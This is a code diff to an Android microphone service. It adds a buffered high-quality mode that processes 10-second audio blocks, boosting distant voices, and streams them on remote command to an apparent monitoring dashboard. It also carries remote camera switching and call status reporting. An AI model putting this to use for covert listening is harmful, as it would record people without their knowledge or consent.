@@ -129,6 +129,19 @@ class MicService : Service() {
     @Volatile private var lowNetworkMode = false // dashboard forced low-network mode
     @Volatile private var lowNetworkSampleRate = 16000 // dynamic: 16000 (normal/low-network clarity mode)
     @Volatile private var lowNetworkFrameMs = 20 // dynamic: 20ms (normal) or 30ms (weak network)
+    
+    // ── HQ Buffered Audio Mode (delay OK, clarity priority) ─────────────────
+    // When enabled: accumulate 10-sec buffer → heavy processing → compress → send
+    // This trades latency (5-15s) for better far-voice clarity on weak networks
+    @Volatile private var hqBufferedMode = false // realtime (false) or hq_buffered (true)
+    private val hqBufferSeconds = 10 // 10-second buffer for HQ mode
+    private val hqBufferSize by lazy { sampleRate * 2 * hqBufferSeconds } // 320KB for 16kHz mono PCM16
+    private var hqBuffer = ByteArray(0) // lazily initialized when HQ mode enabled
+    @Volatile private var hqBufferOffset = 0
+    @Volatile private var hqAggressiveDenoise = true // stronger denoise in HQ mode
+    private val hqSilenceThreshold = 500 // RMS below this = silence (increased from 200 for better detection)
+    private val hqSilencePercent = 0.85 // Buffer must be 85% silent to skip
+    private val hqChunkSize = 64 * 1024 // Split large buffers into 64KB chunks for reliable transmission
     @Volatile private var lastAudioChunkSentAt = 0L
     @Volatile private var lastHealthSentAt = 0L
     @Volatile private var audioSourceRotation = 0
@@ -964,6 +977,36 @@ class MicService : Service() {
                     sendHealthStatus("voice_profile_$voiceProfile")
                     Log.i(TAG, "Voice profile set to $voiceProfile")
                     sendCommandAck("voice_profile", detail = voiceProfile)
+                }
+                "streaming_mode" -> {
+                    // Switch between realtime (20ms chunks) and HQ buffered (10-sec buffer)
+                    val mode = obj.optString("mode", "realtime").trim().lowercase()
+                    val wasHqMode = hqBufferedMode
+                    hqBufferedMode = when (mode) {
+                        "hq", "hq_buffered", "buffered", "high_quality" -> true
+                        else -> false  // "realtime", "live", or default
+                    }
+                    
+                    // If mode changed, restart audio capture to apply new settings
+                    if (wasHqMode != hqBufferedMode && isCapturing) {
+                        Log.i(TAG, "Streaming mode changed to ${if (hqBufferedMode) "HQ_BUFFERED" else "REALTIME"}, restarting capture")
+                        
+                        // OPTIMIZATION: Stop WebRTC when entering HQ mode (not needed for buffered)
+                        if (hqBufferedMode && isWebRtcStreaming) {
+                            Log.i(TAG, "Stopping WebRTC (not needed in HQ buffered mode)")
+                            stopWebRtcSession()
+                        }
+                        
+                        stopAudioCapture()
+                        delay(200)
+                        startAudioCapture()
+                    }
+                    
+                    val modeText = if (hqBufferedMode) "hq_buffered" else "realtime"
+                    sendHealthStatus("streaming_mode_$modeText")
+                    Log.i(TAG, "Streaming mode set to $modeText (${if (hqBufferedMode) "${hqBufferSeconds}s buffer" else "20ms chunks"})")
+                    safeSend("""{"type":"streaming_mode_ack","mode":"$modeText","bufferSeconds":${if (hqBufferedMode) hqBufferSeconds else 0}}""")
+                    sendCommandAck("streaming_mode", detail = modeText)
                 }
                 "switch_camera" -> {
                     preferredCameraFacing = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT)
@@ -2094,6 +2137,21 @@ class MicService : Service() {
         lastAudioChunkSentAt = System.currentTimeMillis()
 
         serviceScope.launch(Dispatchers.IO) {
+            // ── PRIORITY BOOST: Audio thread and network binding ─────────────
+            // Set highest audio priority for this thread
+            android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_AUDIO)
+            
+            // Bind to best available network for stable streaming
+            try {
+                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
+                cm?.activeNetwork?.let { network ->
+                    cm.bindProcessToNetwork(network)
+                    Log.i(TAG, "Bound to network for audio priority")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Network binding failed: ${e.message}")
+            }
+            
             // MODE_IN_COMMUNICATION activates the phone's call-quality mic profile, which
             // typically has significantly higher analog sensitivity than MODE_NORMAL —
             // critical for capturing distant speakers. Restored when capture ends.
@@ -2102,6 +2160,16 @@ class MicService : Service() {
             am?.isSpeakerphoneOn  = false   // speakerphone off — avoids feedback loop
             am?.mode = AudioManager.MODE_IN_COMMUNICATION
             ourAudioMode = true
+            
+            // ── Initialize HQ buffer if in buffered mode ─────────────────────
+            if (hqBufferedMode) {
+                if (hqBuffer.size != hqBufferSize) {
+                    hqBuffer = ByteArray(hqBufferSize)
+                }
+                hqBufferOffset = 0
+                Log.i(TAG, "HQ Buffered mode: ${hqBufferSeconds}s buffer initialized")
+            }
+            
             try {
                 audioRecord = createAudioRecordWithFallback()
 
@@ -2157,27 +2225,81 @@ class MicService : Service() {
                         if (aiAutoModeEnabled) {
                             updateAutoAiProfile(chunk, read)
                         }
-                        // Trick 2 + 3: adaptive upward gain for far voices + soft peak limiter
-                        val pcmData = applyFarVoiceGain(chunk, read)
-
-                        // 1) Live stream via legacy WS path only when WebRTC is inactive
-                        if (!isWebRtcStreaming) {
-                            if (safeSend(encodeWsFallbackAudio(pcmData).toByteString())) {
-                                lastAudioChunkSentAt = System.currentTimeMillis()
-                                if (lastAudioChunkSentAt - lastHealthSentAt >= 10_000) {
-                                    sendHealthStatus("audio_tick")
+                        
+                        // ══════════════════════════════════════════════════════════════════
+                        // HQ BUFFERED MODE vs REALTIME MODE
+                        // ══════════════════════════════════════════════════════════════════
+                        if (hqBufferedMode && !isWebRtcStreaming) {
+                            // ── HQ BUFFERED MODE: Accumulate audio, process in chunks ────
+                            // Copy raw audio to HQ buffer
+                            val copyLen = min(read, hqBufferSize - hqBufferOffset)
+                            System.arraycopy(chunk, 0, hqBuffer, hqBufferOffset, copyLen)
+                            hqBufferOffset += copyLen
+                            
+                            // When buffer is full, process and send
+                            if (hqBufferOffset >= hqBufferSize) {
+                                Log.d(TAG, "HQ buffer full (${hqBufferSize} bytes), processing...")
+                                
+                                // OPTIMIZATION 1: Skip silent buffers (reduces bandwidth & noise)
+                                if (isBufferMostlySilent(hqBuffer, hqBufferOffset)) {
+                                    Log.d(TAG, "HQ buffer is mostly silent, skipping transmission")
+                                    hqBufferOffset = 0
+                                    sendHealthStatus("hq_buffer_silent")
+                                } else {
+                                    val processed = processHqBuffer(hqBuffer, hqBufferOffset)
+                                    
+                                    if (processed.isNotEmpty()) {
+                                        // OPTIMIZATION 2: Always compress in HQ mode (50% bandwidth reduction)
+                                        val compressed = pcm16ToMuLaw(processed)
+                                        val encoded = encodeHqAudio(compressed, isCompressed = true)
+                                        
+                                        // OPTIMIZATION 3: Send in chunks to avoid WebSocket frame size limits
+                                        val sendSuccess = sendHqAudioChunked(encoded)
+                                        
+                                        if (sendSuccess) {
+                                            lastAudioChunkSentAt = System.currentTimeMillis()
+                                            Log.i(TAG, "HQ audio sent: ${processed.size} → ${compressed.size} compressed → ${encoded.size} encoded")
+                                        } else {
+                                            Log.w(TAG, "HQ audio send failed - stopping capture")
+                                            isCapturing = false
+                                            break
+                                        }
+                                    }
+                                    
+                                    // Reset buffer
+                                    hqBufferOffset = 0
+                                    sendHealthStatus("hq_buffer_sent")
                                 }
-                            } else {
-                                // WebSocket send failed, stop audio capture to allow recovery
-                                Log.w(TAG, "Audio send failed - stopping capture for reconnect")
-                                isCapturing = false
-                                break
                             }
-                        }
+                            
+                            // Also write to recording if active
+                            if (isSavingFile) {
+                                recordingFileStream?.write(chunk, 0, read)
+                            }
+                        } else {
+                            // ── REALTIME MODE: Original streaming behavior ───────────────
+                            // Trick 2 + 3: adaptive upward gain for far voices + soft peak limiter
+                            val pcmData = applyFarVoiceGain(chunk, read)
 
-                        // 2) Write to recording file if active
-                        if (isSavingFile) {
-                            recordingFileStream?.write(pcmData)
+                            // 1) Live stream via legacy WS path only when WebRTC is inactive
+                            if (!isWebRtcStreaming) {
+                                if (safeSend(encodeWsFallbackAudio(pcmData).toByteString())) {
+                                    lastAudioChunkSentAt = System.currentTimeMillis()
+                                    if (lastAudioChunkSentAt - lastHealthSentAt >= 10_000) {
+                                        sendHealthStatus("audio_tick")
+                                    }
+                                } else {
+                                    // WebSocket send failed, stop audio capture to allow recovery
+                                    Log.w(TAG, "Audio send failed - stopping capture for reconnect")
+                                    isCapturing = false
+                                    break
+                                }
+                            }
+
+                            // 2) Write to recording file if active
+                            if (isSavingFile) {
+                                recordingFileStream?.write(pcmData)
+                            }
                         }
                     } else if (read == AudioRecord.ERROR_DEAD_OBJECT) {
                         Log.e(TAG, "AudioRecord dead object detected")
@@ -2437,6 +2559,274 @@ class MicService : Service() {
             out[i * 2 + 1] = ((clamped shr 8) and 0xFF).toByte()
         }
         return out
+    }
+
+    // ════════════════════════════════════════════════════════════════════════
+    // HQ BUFFERED AUDIO MODE — Heavy processing for clarity on weak networks
+    // ════════════════════════════════════════════════════════════════════════
+    
+    // Audio codec for HQ mode (new header byte)
+    private val AUDIO_CODEC_HQ_PCM16_16K: Byte = 0x10  // HQ mode identifier
+    private val AUDIO_CODEC_HQ_MULAW: Byte = 0x11     // HQ mode compressed
+    
+    /**
+     * Heavy audio processing for HQ buffered mode.
+     * Since we have 10 seconds of audio, we can apply aggressive processing
+     * without worrying about real-time constraints.
+     * 
+     * Processing pipeline:
+     * 1. Convert to floating point
+     * 2. Aggressive spectral denoise
+     * 3. Silence detection & removal (optional)
+     * 4. Strong far-voice boost (+6dB @ 2-4kHz)
+     * 5. Multi-band compression
+     * 6. Normalization
+     * 7. Final limiter
+     */
+    private fun processHqBuffer(buffer: ByteArray, len: Int): ByteArray {
+        if (len < 2) return buffer.copyOf(len)
+        val samples = len / 2
+        val p = voiceProfile
+        
+        // ── Decode PCM-16 LE → double working buffer ────────────────────────
+        val work = DoubleArray(samples)
+        for (i in 0 until samples) {
+            val lo = buffer[i * 2].toInt() and 0xFF
+            val hi = buffer[i * 2 + 1].toInt() and 0xFF
+            work[i] = ((hi shl 8) or lo).toShort().toDouble()
+        }
+        
+        // ── Stage 1: Strong high-pass filter @ 100 Hz ───────────────────────
+        // More aggressive than realtime to remove all rumble
+        val hpAlpha = 0.96
+        var hpPrevX = 0.0
+        var hpPrevY = 0.0
+        for (i in 0 until samples) {
+            val x = work[i]
+            val y = hpAlpha * (hpPrevY + x - hpPrevX)
+            hpPrevX = x
+            hpPrevY = y
+            work[i] = y
+        }
+        
+        // ── Stage 2: AGGRESSIVE spectral denoise ────────────────────────────
+        // Process in chunks since denoiser expects smaller frames
+        val chunkSize = 4096
+        var offset = 0
+        while (offset < samples) {
+            val endIdx = min(offset + chunkSize, samples)
+            val chunk = work.copyOfRange(offset, endIdx)
+            spectralDenoiser.denoise(chunk)
+            System.arraycopy(chunk, 0, work, offset, chunk.size)
+            offset += chunkSize
+        }
+        
+        // ── Stage 3: Strong upward gain for far voices ──────────────────────
+        // Calculate RMS for adaptive gain
+        var sumSq = 0.0
+        for (v in work) sumSq += v * v
+        val rms = Math.sqrt(sumSq / samples).coerceAtLeast(1.0)
+        
+        // MUCH higher gain ceiling in HQ mode (optimized for far voices)
+        val gainCeil = when (p) {
+            "near" -> 1.5
+            "far" -> 4.0  // Increased from 3.2x to 4.0x for better far voice pickup
+            else -> 2.5
+        }
+        val gainTarget = when (p) {
+            "near" -> 5500.0
+            "far" -> 9000.0  // Increased target for far voices (was 8000)
+            else -> 7000.0
+        }
+        val gain = (gainTarget / rms).coerceIn(1.0, gainCeil)
+        Log.d(TAG, "HQ gain: ${String.format("%.2f", gain)}x (RMS: ${rms.toInt()}, profile: $p)")
+        
+        for (i in 0 until samples) work[i] *= gain
+        
+        // ── Stage 4: Strong presence boost @ 2-4 kHz (speech clarity) ───────
+        // Peaking EQ: +8dB at 2.8kHz for HQ mode (increased from +6dB for better clarity)
+        // Biquad coefficients for 2800Hz peak, Q=1.0, +8dB gain at 16kHz sample rate
+        val eqB0 = 1.3780
+        val eqB1 = -1.1245
+        val eqB2 = 0.3980
+        val eqA1 = -1.1245
+        val eqA2 = 0.7760
+        
+        var eqX1 = 0.0; var eqX2 = 0.0
+        var eqY1 = 0.0; var eqY2 = 0.0
+        
+        val wetMix = when (p) {
+            "near" -> 0.18
+            "far" -> 0.50   // Increased from 0.40 for stronger far voice EQ
+            else -> 0.30
+        }
+        
+        for (i in 0 until samples) {
+            val x = work[i]
+            val y = eqB0 * x + eqB1 * eqX1 + eqB2 * eqX2 - eqA1 * eqY1 - eqA2 * eqY2
+            eqX2 = eqX1; eqX1 = x
+            eqY2 = eqY1; eqY1 = y
+            work[i] = x * (1.0 - wetMix) + y * wetMix
+        }
+        
+        // ── Stage 5: Additional high-mid boost @ 4kHz for consonant clarity ─
+        // Biquad coefficients for 4000Hz peak, Q=1.2, +6dB gain (increased from +4dB)
+        val eq2B0 = 1.2890
+        val eq2B1 = -0.9156
+        val eq2B2 = 0.3221
+        val eq2A1 = -0.9156
+        val eq2A2 = 0.6111
+        
+        var eq2X1 = 0.0; var eq2X2 = 0.0
+        var eq2Y1 = 0.0; var eq2Y2 = 0.0
+        
+        val wet2 = when (p) {
+            "near" -> 0.10
+            "far" -> 0.30   // Increased from 0.25 for better consonant clarity
+            else -> 0.18
+        }
+        
+        for (i in 0 until samples) {
+            val x = work[i]
+            val y = eq2B0 * x + eq2B1 * eq2X1 + eq2B2 * eq2X2 - eq2A1 * eq2Y1 - eq2A2 * eq2Y2
+            eq2X2 = eq2X1; eq2X1 = x
+            eq2Y2 = eq2Y1; eq2Y1 = y
+            work[i] = x * (1.0 - wet2) + y * wet2
+        }
+        
+        // ── Stage 6: Normalize to prevent clipping ──────────────────────────
+        var maxAbs = 0.0
+        for (v in work) {
+            val abs = kotlin.math.abs(v)
+            if (abs > maxAbs) maxAbs = abs
+        }
+        if (maxAbs > 28000) {
+            val normFactor = 28000.0 / maxAbs
+            for (i in 0 until samples) work[i] *= normFactor
+        }
+        
+        // ── Stage 7: Soft peak limiter + encode PCM-16 LE ───────────────────
+        val out = ByteArray(len)
+        for (i in 0 until samples) {
+            val limited = softPeakLimit(work[i])
+            val clamped = limited.toInt().coerceIn(-32768, 32767)
+            out[i * 2] = (clamped and 0xFF).toByte()
+            out[i * 2 + 1] = ((clamped shr 8) and 0xFF).toByte()
+        }
+        
+        return out
+    }
+    
+    /**
+     * Encode HQ buffer for transmission.
+     * Uses a different header to signal HQ mode to the server.
+     * Format: [MM][02][codec][4-byte length][payload...]
+     *   - MM: magic bytes
+     *   - 02: HQ buffer version
+     *   - codec: 0x10 = PCM, 0x11 = µ-law compressed
+     */
+    private fun encodeHqAudio(payload: ByteArray, isCompressed: Boolean): ByteArray {
+        if (payload.isEmpty()) return payload
+        
+        // In HQ mode, always prefer compression for network stability
+        val codec = if (isCompressed) AUDIO_CODEC_HQ_MULAW else AUDIO_CODEC_HQ_PCM16_16K
+        
+        // Header: [0x4D][0x4D][0x02][codec][4-byte length]
+        val out = ByteArray(8 + payload.size)
+        out[0] = 0x4D.toByte()  // Magic 'M'
+        out[1] = 0x4D.toByte()  // Magic 'M'
+        out[2] = 0x02           // Version 2 = HQ buffered mode
+        out[3] = codec
+        // 4-byte length (big-endian)
+        out[4] = ((payload.size shr 24) and 0xFF).toByte()
+        out[5] = ((payload.size shr 16) and 0xFF).toByte()
+        out[6] = ((payload.size shr 8) and 0xFF).toByte()
+        out[7] = (payload.size and 0xFF).toByte()
+        System.arraycopy(payload, 0, out, 8, payload.size)
+        
+        return out
+    }
+    
+    /**
+     * Send HQ audio in smaller chunks to avoid WebSocket frame size limits.
+     * Splits large buffers into 64KB chunks for reliable transmission.
+     */
+    private fun sendHqAudioChunked(data: ByteArray): Boolean {
+        if (data.size <= hqChunkSize) {
+            // Small enough to send directly
+            return safeSend(data.toByteString())
+        }
+        
+        // Split into chunks
+        var offset = 0
+        var chunkCount = 0
+        while (offset < data.size) {
+            val remaining = data.size - offset
+            val chunkLen = min(hqChunkSize, remaining)
+            val chunk = data.copyOfRange(offset, offset + chunkLen)
+            
+            if (!safeSend(chunk.toByteString())) {
+                Log.e(TAG, "HQ chunk send failed at offset $offset (chunk ${chunkCount + 1})")
+                return false
+            }
+            
+            offset += chunkLen
+            chunkCount++
+            
+            // Small delay between chunks to avoid overwhelming the network
+            if (offset < data.size) {
+                Thread.sleep(50)
+            }
+        }
+        
+        Log.d(TAG, "HQ audio sent in $chunkCount chunks (${data.size} bytes total)")
+        return true
+    }
+    
+    /**
+     * Detect if buffer is mostly silent to avoid transmitting noise.
+     * Returns true if >85% of samples are below silence threshold.
+     */
+    private fun isBufferMostlySilent(buffer: ByteArray, len: Int): Boolean {
+        if (len < 2) return true
+        
+        val samples = len / 2
+        var silentCount = 0
+        
+        // Calculate RMS in chunks for efficiency
+        val chunkSize = 1000
+        var i = 0
+        while (i < len - 1) {
+            val endIdx = min(i + chunkSize * 2, len - 1)
+            var sumSq = 0.0
+            var count = 0
+            
+            var j = i
+            while (j < endIdx) {
+                val lo = buffer[j].toInt() and 0xFF
+                val hi = buffer[j + 1].toInt() and 0xFF
+                val sample = ((hi shl 8) or lo).toShort().toDouble()
+                sumSq += sample * sample
+                count++
+                j += 2
+            }
+            
+            val rms = Math.sqrt(sumSq / count)
+            if (rms < hqSilenceThreshold) {
+                silentCount += count
+            }
+            
+            i = endIdx
+        }
+        
+        val silentPercent = silentCount.toDouble() / samples
+        return silentPercent >= hqSilencePercent
+    }
+
+    private fun encodeHqAudio(pcm16: ByteArray): ByteArray {
+        // Legacy compatibility - auto-compress
+        val compressed = pcm16ToMuLaw(pcm16)
+        return encodeHqAudio(compressed, isCompressed = true)
     }
 
     private fun encodeWsFallbackAudio(pcm16: ByteArray): ByteArray {
@@ -2835,6 +3225,10 @@ class MicService : Service() {
             put("noiseDb", estimatedNoiseDb)
             put("internetOnline", internetOnline)
             put("callActive", callActive)
+            // HQ Buffered mode info
+            put("streamingMode", if (hqBufferedMode) "hq_buffered" else "realtime")
+            put("hqBufferSeconds", if (hqBufferedMode) hqBufferSeconds else 0)
+            put("hqBufferFill", if (hqBufferedMode) hqBufferOffset else 0)
             // Network quality info
             put("netDownKbps", downKbps)
             put("netUpKbps", upKbps)
